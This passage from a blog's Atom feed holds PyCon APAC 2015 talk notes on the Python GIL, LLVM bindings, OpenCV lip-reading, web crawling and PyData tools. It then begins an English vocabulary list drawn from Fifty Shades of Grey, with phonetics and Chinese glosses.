&lt;li&gt;Giant Lock  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL in CPython protects  &lt;ul&gt;
&lt;li&gt;Interpreter state, thread state, ...  &lt;/li&gt;
&lt;li&gt;reference count  &lt;/li&gt;
&lt;li&gt;"a Guarantee"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other implementations  &lt;ul&gt;
&lt;li&gt;fine-grained Lock  &lt;ul&gt;
&lt;li&gt;把 lock 切小  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lock-free  &lt;ul&gt;
&lt;li&gt;不需要 Lock - 兩種  &lt;ul&gt;
&lt;li&gt;algorithm  &lt;/li&gt;
&lt;li&gt;底層操作達到 atomic  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把 lock offload 到下一層  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL 好做  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL over multi-processor  &lt;ul&gt;
&lt;li&gt;Want to produce efficient program.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL 該不該存在，需不需要拿掉?  &lt;ul&gt;
&lt;li&gt;問題  &lt;ul&gt;
&lt;li&gt;有太多 legacy 的東西要處理  &lt;/li&gt;
&lt;li&gt;「男子漢的約定不能改變！」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Brainless Solution for multi-process  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Embarrassingly parallel  &lt;ul&gt;
&lt;li&gt;no dependency between those parallel tasks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IPC-required parallel tasks  &lt;ul&gt;
&lt;li&gt;share states with other peers  &lt;/li&gt;
&lt;li&gt;the most costly overhead of the GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;multiprocessing  &lt;ul&gt;
&lt;li&gt;process pool  &lt;/li&gt;
&lt;li&gt;nondeterministic  &lt;ul&gt;
&lt;li&gt;the same input, different output.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;further observations  &lt;ul&gt;
&lt;li&gt;workers are forked when initializing the pool, they share the same memory copy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pp (parallel python) remote node  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ppserver.py -v 1 -p 10000 &amp;amp;&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Release the GIL  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;ctypes  &lt;ul&gt;
&lt;li&gt;thread for GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python / C extension  &lt;ul&gt;
&lt;li&gt;linking to the busy.so extension  &lt;/li&gt;
&lt;li&gt;When it comes to C thread vs Python thread battle, C thread always win.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cooperative Multitasking  &lt;ul&gt;
&lt;li&gt;Only applicable to IO-bound tasks  &lt;/li&gt;
&lt;li&gt;Single process, single Threads  &lt;ul&gt;
&lt;li&gt;no other thread, no GIL battle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Executing the code when exactly needed  &lt;/li&gt;
&lt;li&gt;Examples:  &lt;ul&gt;
&lt;li&gt;generator (太 geek，容易寫錯)  &lt;/li&gt;
&lt;li&gt;pyev (recommended)  &lt;ul&gt;
&lt;li&gt;link to libe  &lt;/li&gt;
&lt;li&gt;實際上會使用 io watcher  &lt;/li&gt;
&lt;li&gt;further observations  &lt;ul&gt;
&lt;li&gt;不用任何 symbol 去接、重複使用同一個 symbol 都會造成 segmentation fault  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gevent (recommended)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interpreter as an Instance (rough idea)  &lt;ul&gt;
&lt;li&gt;C program, singel process, multi-thread  &lt;ul&gt;
&lt;li&gt;still can share states with relatively low penalty  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Allocate memory space for interpreter context  &lt;ul&gt;
&lt;li&gt;that is, accept an address to put instance context in Py_Initialize()  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;How to live along with GIL well?  &lt;ul&gt;
&lt;li&gt;Multi-process  &lt;/li&gt;
&lt;li&gt;Release the GIL  &lt;/li&gt;
&lt;li&gt;Cooperative Multitasking  &lt;ul&gt;
&lt;li&gt;for IO-bound solution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Perhaps, Interpreter as an Instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python &amp;amp; LLVM - 李楓&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;llvmpy  &lt;ul&gt;
&lt;li&gt;urls  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.llvmpy.org"&gt;http://www.llvmpy.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/llvmpy/llvmpy"&gt;https://github.com/llvmpy/llvmpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;llvm.core  &lt;/li&gt;
&lt;li&gt;Pros  &lt;ul&gt;
&lt;li&gt;Support Python 3.x  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons  &lt;ul&gt;
&lt;li&gt;only support to LLVM 3.3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;llvmlite  &lt;ul&gt;
&lt;li&gt;urls  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/numba/llvmlite"&gt;https://github.com/numba/llvmlite&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://llvmlite.pydata.org/"&gt;http://llvmlite.pydata.org/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A lightweight LLVM python Binding for writing JIT compilers  &lt;/li&gt;
&lt;li&gt;架構比 llvmpy 簡潔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HPC  &lt;ul&gt;
&lt;li&gt;Heterogeneous Parallel Computing  &lt;/li&gt;
&lt;li&gt;High Performance Computing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anaconda  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://continuum.io/downloads"&gt;http://continuum.io/downloads&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://store.continuum.io/cshop/anaconda/"&gt;https://store.continuum.io/cshop/anaconda/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Black Scholes example  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debugging  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://lldb.llvm.org"&gt;LLDB&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Debuger for LLVM  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://lldb.llvm.org/build.html"&gt;http://lldb.llvm.org/build.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;使用 CMake + Ninja  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/upbit/lldb-capstone-arm"&gt;LLDB-Capstone&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;LLVM's Machine Code (MC) layer  &lt;/li&gt;
&lt;li&gt;Python Binding  &lt;ul&gt;
&lt;li&gt;support Python 2 &amp;amp; 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wisk/medusa"&gt;Medusa&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python 讓你的眼睛看得見 - Yu-Chi Lin&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;McGurk 效應  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/錯聽"&gt;錯聽 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;資料從哪來  &lt;ul&gt;
&lt;li&gt;英文語料庫：AVleter, CUAVE, OuluVS, IBMSR, IBMIH  &lt;/li&gt;
&lt;li&gt;中文語料庫：找不到，所以資料庫自己建  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己建資料庫  &lt;ul&gt;
&lt;li&gt;透過安排好的語料，隨機讓受試者唸出，並錄影錄音。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenCV  &lt;/li&gt;
&lt;li&gt;研究架構  &lt;ul&gt;
&lt;li&gt;臉部偵測 =&amp;gt; 嘴巴偵測 =&amp;gt; 相鄰 frame 的變化量計算，切出音節  &lt;/li&gt;
&lt;li&gt;聲音訊號分析 =&amp;gt; 以波形能量切音節  &lt;/li&gt;
&lt;li&gt;結合以上兩個，以聲音為主，影像為輔，切出正確音節  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;偵測  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://alereimondo.no-ip.org/OpenCV/34"&gt;Haar feature&lt;/a&gt;, Adaboost  &lt;/li&gt;
&lt;li&gt;The haar cascade for mouth  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果你要訓練一個自己的分類器?  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://coding-robin.de/2013/07/22/train-your-own-opencv-haar-classifier.html"&gt;train your own opencv haar classifier&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mrnugget/opencv-haar-classifier-training"&gt;https://github.com/mrnugget/opencv-haar-classifier-training&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼判斷電腦切音節切得好不好？=&amp;gt; 還是得靠人力來判斷  &lt;ul&gt;
&lt;li&gt;聲音切音節 + 人力切音節 =&amp;gt; 得到最接近正確音節的位置  &lt;/li&gt;
&lt;li&gt;其他切音節的方法  &lt;ul&gt;
&lt;li&gt;以嘴巴開合的面積大小來計算  &lt;ul&gt;
&lt;li&gt;以顏色判別嘴唇或皮膚，以此計算開合大小  &lt;/li&gt;
&lt;li&gt;HSV colorspace  &lt;/li&gt;
&lt;li&gt;框出嘴唇的外輪廓，計算面積大小  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenCV in Machine Learning  &lt;ul&gt;
&lt;li&gt;scikit-learn  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;以雲端語音合成技術為基礎的音文同步有聲書之建立系統 - Chao-Ka Chang&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;google TTS  &lt;/li&gt;
&lt;li&gt;Python MTK  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;龜作圖&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3.5/library/turtle.html"&gt;https://docs.python.org/3.5/library/turtle.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Turtle_graphics"&gt;http://en.wikipedia.org/wiki/Turtle_graphics&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;LT&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;網頁爬蟲  &lt;ul&gt;
&lt;li&gt;urllib2  &lt;/li&gt;
&lt;li&gt;pycurl  &lt;/li&gt;
&lt;li&gt;selenium  &lt;/li&gt;
&lt;li&gt;virtkey, pytesser  &lt;/li&gt;
&lt;li&gt;use thread  &lt;/li&gt;
&lt;li&gt;被 ban  &lt;ul&gt;
&lt;li&gt;睡覺皇帝大, sleep  &lt;/li&gt;
&lt;li&gt;proxy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day3 - 2015/06/07 - Sun&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-3-June-7-KkH9iGy5gFb"&gt;PyCon APAC 2015 - Day 3 (June 7) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;- Andy Terrel&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;The Fundamental Physics  &lt;ul&gt;
&lt;li&gt;Moving / Copying data is more expensive than computation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Business Data Processing  &lt;/li&gt;
&lt;li&gt;Scientific Data Processing  &lt;/li&gt;
&lt;li&gt;"Data Has Mass"  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://datagravity.org/2012/06/26/a-formula-for-data-gravity/"&gt;Data Gravity&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Memory Matters  &lt;ul&gt;
&lt;li&gt;1980s  &lt;/li&gt;
&lt;li&gt;90s - 00s  &lt;ul&gt;
&lt;li&gt;L1, L2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010s  &lt;ul&gt;
&lt;li&gt;L3  &lt;/li&gt;
&lt;li&gt;SSD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Speed Matters  &lt;/li&gt;
&lt;li&gt;"Data Scientist" Dilemma  &lt;ul&gt;
&lt;li&gt;Massive data to deal with (must bring code to data)  &lt;/li&gt;
&lt;li&gt;Cacophony of tools, data-bases, and products to integrate  &lt;/li&gt;
&lt;li&gt;Modern hardware tempts to be used but mostly idel (GPUs, data0center clusters)  &lt;/li&gt;
&lt;li&gt;Huge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Python --- Spectrum  &lt;ul&gt;
&lt;li&gt;Occasional  &lt;ul&gt;
&lt;li&gt;Cut and Paste  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scientist Developer  &lt;ul&gt;
&lt;li&gt;Extend frameworks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Developer  &lt;ul&gt;
&lt;li&gt;Create frameworks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unique aspect of Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecting for Data  &lt;ul&gt;
&lt;li&gt;Data exploration as the central task.  &lt;/li&gt;
&lt;li&gt;Data visualization as a first-  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building Exploratory Data Platforms  &lt;ul&gt;
&lt;li&gt;Environments  &lt;ul&gt;
&lt;li&gt;Wakari  &lt;/li&gt;
&lt;li&gt;Anaconda  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analytics  &lt;ul&gt;
&lt;li&gt;Blaze  &lt;/li&gt;
&lt;li&gt;Numba  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Visualization  &lt;ul&gt;
&lt;li&gt;Bokeh  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Our Position  &lt;ul&gt;
&lt;li&gt;No one-size-fits-all pint-and-click application is enough to solve business problems.  &lt;/li&gt;
&lt;li&gt;A language-based platform is needed. ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Science Discovery Process  &lt;ul&gt;
&lt;li&gt;Data Acquistition - Blaze  &lt;/li&gt;
&lt;li&gt;Data Preparation - Anaconda server  &lt;/li&gt;
&lt;li&gt;Data Analysis - IPython Notebook  &lt;/li&gt;
&lt;li&gt;Data Interpretation - Bokeh  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Important Pieces of the Platform  &lt;ul&gt;
&lt;li&gt;Anaconda - easy to install, plus lots of libraries  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building a better PyData Ecosystem  &lt;/li&gt;
&lt;li&gt;Open SOurce Technology  &lt;ul&gt;
&lt;li&gt;Blaze  &lt;ul&gt;
&lt;li&gt;Array URLs and compute servers for breaking down data-silos.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bokeh  &lt;ul&gt;
&lt;li&gt;Interactive Visualization in the Browser for Python (and other languages) of large data.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numba  &lt;ul&gt;
&lt;li&gt;Optimizaing Compiler for subset of Python which allows multi-core, multi-process and basic CPU support  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Pain  &lt;ul&gt;
&lt;li&gt;Dealing with data applications has numerous pain points  &lt;/li&gt;
&lt;li&gt;Hundreds of data formats  &lt;/li&gt;
&lt;li&gt;Basic programs expect all data to fit in memory  &lt;/li&gt;
&lt;li&gt;Data analysis pipelines constantly changin from one form to another  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Blaze  &lt;ul&gt;
&lt;li&gt;NEED, TOOL, CAPABILITY  &lt;/li&gt;
&lt;li&gt;Compisition  &lt;ul&gt;
&lt;li&gt;Distributed Systems  &lt;ul&gt;
&lt;li&gt;spark  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scientific Computing  &lt;ul&gt;
&lt;li&gt;HDFS  &lt;/li&gt;
&lt;li&gt;bcolz  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BI - DB  &lt;ul&gt;
&lt;li&gt;mongo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DM/Stats/ML  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Abstract experssions, Data Storage, Computational Backend  &lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;Flexible  &lt;/li&gt;
&lt;li&gt;Use compilation of deferred expressions to optimize data interactions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dask  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://dask.pydata.org"&gt;http://dask.pydata.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;DAG - TASKS  &lt;ul&gt;
&lt;li&gt;Collections, Task Graph, Schedulers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ODO  &lt;ul&gt;
&lt;li&gt;Shapeshifting for your data  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;odo(source, target)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numba  &lt;ul&gt;
&lt;li&gt;JIT, Dynamic compiler for Python  &lt;/li&gt;
&lt;li&gt;Optimize data-parallel computations at call time, to take advantage of local hardware configuration  &lt;/li&gt;
&lt;li&gt;Compatible with C, C++, Fortran  &lt;/li&gt;
&lt;li&gt;C++, C, Fortran, Python =&amp;gt; LLVM IR =&amp;gt; x86, ARM, PTX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Visualization  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bokeh.pydata.org/en/latest/"&gt;Bokeh&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/bokeh/bokeh"&gt;https://github.com/bokeh/bokeh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Interactive  &lt;/li&gt;
&lt;li&gt;Novel graphics  &lt;/li&gt;
&lt;li&gt;Streaming, dynamic, large data  &lt;/li&gt;
&lt;li&gt;For the browser, with or without a server  &lt;/li&gt;
&lt;li&gt;Matplotlib compatibility  &lt;/li&gt;
&lt;li&gt;No need to write Jade  &lt;/li&gt;
&lt;li&gt;No JavaScript  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Machine learning in Finance using Python - Eric Tham&lt;/h4&gt;
&lt;p&gt;&lt;a href="http://www.slideshare.net/erictham/machine-learning-in-finance-using-python"&gt;http://www.slideshare.net/erictham/machine-learning-in-finance-using-python&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;Pattern recognition, algorithm, data, prediction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is machine Learning  &lt;/li&gt;
&lt;li&gt;Machine in Finance  &lt;ul&gt;
&lt;li&gt;Sentiment Analysis (Behavoiural finance)  &lt;/li&gt;
&lt;li&gt;Credit analytics  &lt;/li&gt;
&lt;li&gt;Financial forecasting  &lt;ul&gt;
&lt;li&gt;Technical transformation on Data  &lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Portfolio allocation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Conf"></category><category term="Python"></category><category term="PyCon"></category><category term="PyConAPAC"></category><category term="Thought"></category></entry><entry><title>Vocabulary of Fifty Shades of Grey</title><link href="https://blog.m157q.tw/posts/2015/07/25/vocabulary-of-fifty-shades-of-grey/" rel="alternate"></link><published>2015-10-27T12:36:00+08:00</published><updated>2015-10-27T12:36:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-07-25:posts/2015/07/25/vocabulary-of-fifty-shades-of-grey/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;courteous&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ɝ&lt;/span&gt;&lt;span class="n"&gt;tj&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;tj&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;殷勤的，謙恭的，有禮貌的&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;towards&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;She&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;courteous&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;everyone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;她對大家都很有禮貌。&lt;/span&gt;  


&lt;span class="n"&gt;intimidating&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="err"&gt;ə͵&lt;/span&gt;&lt;span class="n"&gt;det&lt;/span&gt;&lt;span class="err"&gt;ɪŋ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;timideiti&lt;/span&gt;&lt;span class="err"&gt;ŋ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;嚇人的，令人生畏的&lt;/span&gt;  


&lt;span class="n"&gt;fascinating&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;sn&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;et&lt;/span&gt;&lt;span class="err"&gt;ɪŋ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;sineiti&lt;/span&gt;&lt;span class="err"&gt;ŋ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;迷人的；極美的；極好的&lt;/span&gt;  
    &lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;idea&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;fascinating&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;這主意好極了。&lt;/span&gt;  


&lt;span class="n"&gt;fascination&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;sn&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;sinei&lt;/span&gt;&lt;span class="err"&gt;ʃə&lt;/span&gt;&lt;span 